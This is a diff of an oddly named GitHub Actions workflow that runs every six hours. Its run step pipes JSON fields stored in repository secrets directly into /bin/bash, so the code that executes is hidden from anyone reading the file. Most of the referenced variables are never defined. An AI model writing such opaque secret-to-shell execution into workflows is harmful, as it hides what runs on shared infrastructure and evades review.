@@ -2,27 +2,26 @@ name: xuxijiao7891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
+    - cron: '15 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xuxijiao7891
         env:
-          g3: ${{ secrets.g3 }}
+          hlplq8242: ${{ secrets.hlplq8242 }}
         run: |
-          echo $g3 | jq -r .b40 | /bin/bash
-          echo $l546 | jq -r .lo8961 | /bin/bash
-          echo $hihyj396 | jq -r .rgtct0 | /bin/bash
-          echo $sx4 | jq -r .nc11 | /bin/bash
-          echo $dwny8412 | jq -r .dffwg5090 | /bin/bash
-          echo $foo8 | jq -r .fh340 | /bin/bash
-          echo $lyos650 | jq -r .aqxkh167 | /bin/bash
-          echo $ngnmd0277 | jq -r .o8242 | /bin/bash
-          echo $sfku284 | jq -r .xwkh9482 | /bin/bash
-          echo $jylv0 | jq -r .j71 | /bin/bash
-          echo $gzj39 | jq -r .xbyir0397 | /bin/bash
-          echo $gqo34623 | jq -r .iztr64296 | /bin/bash
+          echo $hlplq8242 | jq -r .abcqz101 | /bin/bash
+          echo $gdybz0780 | jq -r .cfyqf98906 | /bin/bash
+          echo $h823 | jq -r .gs7456 | /bin/bash
+          echo $dqq7350 | jq -r .k850 | /bin/bash
+          echo $m48 | jq -r .inx56 | /bin/bash
+          echo $ulyhp304 | jq -r .kg6 | /bin/bash
+          echo $crx187 | jq -r .jevck50735 | /bin/bash
+          echo $frpxh86088 | jq -r .f7650 | /bin/bash
+          echo $wiky4 | jq -r .fjpx910 | /bin/bash
+          echo $jxob627 | jq -r .f7 | /bin/bash
 
